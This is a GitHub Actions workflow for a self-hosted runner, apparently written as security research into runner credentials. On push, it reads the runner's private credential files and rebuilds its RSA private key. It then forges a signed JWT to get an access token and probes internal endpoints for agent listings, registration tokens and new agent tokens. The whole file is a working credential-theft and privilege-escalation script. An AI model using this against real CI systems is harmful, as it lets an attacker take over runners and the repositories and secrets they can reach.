name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Find Correct Endpoint
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
          
          python3 -c "
          import json, time, base64, jwt
          import urllib.request, urllib.parse, urllib.error
          from cryptography.hazmat.backends import default_backend
          from cryptography.hazmat.primitives.asymmetric.rsa import (
              RSAPrivateNumbers, RSAPublicNumbers
          )
          
          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
              params = json.load(f)
          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
              creds = json.load(f)
          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
              runner = json.load(f)
          
          def b64_to_int(b64):
              b64 += '=' * (4 - len(b64) % 4)
              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
          
          private_numbers = RSAPrivateNumbers(
              p=b64_to_int(params['p']),
              q=b64_to_int(params['q']),
              d=b64_to_int(params['d']),
              dmp1=b64_to_int(params['dp']),
              dmq1=b64_to_int(params['dq']),
              iqmp=b64_to_int(params['inverseQ']),
              public_numbers=RSAPublicNumbers(
                  e=b64_to_int(params['exponent']),
                  n=b64_to_int(params['modulus'])
              )
          )
          private_key = private_numbers.private_key(default_backend())
          
          client_id = creds['data']['clientId']
          auth_url = creds['data']['authorizationUrl']
          server_url = runner['serverUrl']
          server_url_v2 = runner['serverUrlV2']
          pool_id = runner['poolId']
          agent_id = runner['agentId']
          
          # Get access token
          now = int(time.time())
          payload = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'nbf': now,
              'exp': now + 270,
              'jti': str(now)
          }
          client_assertion = jwt.encode(payload, private_key, algorithm='RS256')
          
          form_data = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion,
              'client_id': client_id
          }).encode()
          
          req = urllib.request.Request(
              auth_url, method='POST', data=form_data,
              headers={
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Accept': 'application/json'
              }
          )
          with urllib.request.urlopen(req) as resp:
              token_response = json.loads(resp.read().decode())
              access_token = token_response['access_token']
              print('Access Token Obtained!')
          
          headers_auth = {
              'Authorization': f'Bearer {access_token}',
              'Accept': 'application/json',
              'Content-Type': 'application/json'
          }
          
          headers_post = {
              'Authorization': f'Bearer {access_token}',
              'Accept': 'application/json',
              'Content-Length': '0'
          }
          
          # Try correct Azure DevOps style endpoints
          endpoints = [
              # Connection data - verify token works
              ('CONNECTION DATA', 'GET',
               f'{server_url}_apis/connectionData',
               headers_auth, None),
               
              # List agents in pool
              ('LIST AGENTS', 'GET',
               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
               headers_auth, None),
               
              # Get specific agent
              ('GET AGENT', 'GET',
               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}',
               headers_auth, None),
               
              # Agent registration token - correct endpoint
              ('AGENT REG TOKEN', 'GET',
               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistration',
               headers_auth, None),
               
              # Try broker v2 endpoints
              ('BROKER CONNECTION', 'GET',
               f'{server_url_v2}_apis/connectionData',
               headers_auth, None),
               
              # Try generating new token via agent endpoint
              ('NEW AGENT TOKEN', 'POST',
               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
               headers_post, b''),
               
              # vstoken endpoint
              ('VSTOKEN', 'POST',
               f'https://vstoken.actions.githubusercontent.com/_apis/oauth2/token',
               {**headers_post, 
                'Content-Type': 'application/x-www-form-urlencoded'},
               urllib.parse.urlencode({
                   'grant_type': 'client_credentials',
                   'client_id': client_id
               }).encode()),
          ]
          
          for name, method, ep, hdrs, data in endpoints:
              print(f'\n--- {name} ---')
              print(f'URL: {ep}')
              try:
                  reg_req = urllib.request.Request(
                      ep,
                      method=method,
                      data=data,
                      headers=hdrs
                  )
                  with urllib.request.urlopen(reg_req) as reg_resp:
                      response = reg_resp.read().decode()
                      print(f'SUCCESS {reg_resp.status}:')
                      # Pretty print if JSON
                      try:
                          print(json.dumps(json.loads(response), indent=2)[:500])
                      except:
                          print(response[:500])
              except urllib.error.HTTPError as e:
                  body = e.read().decode()[:300]
                  print(f'HTTP {e.code}:', body)
              except Exception as ex:
                  print('Error:', str(ex))
          "
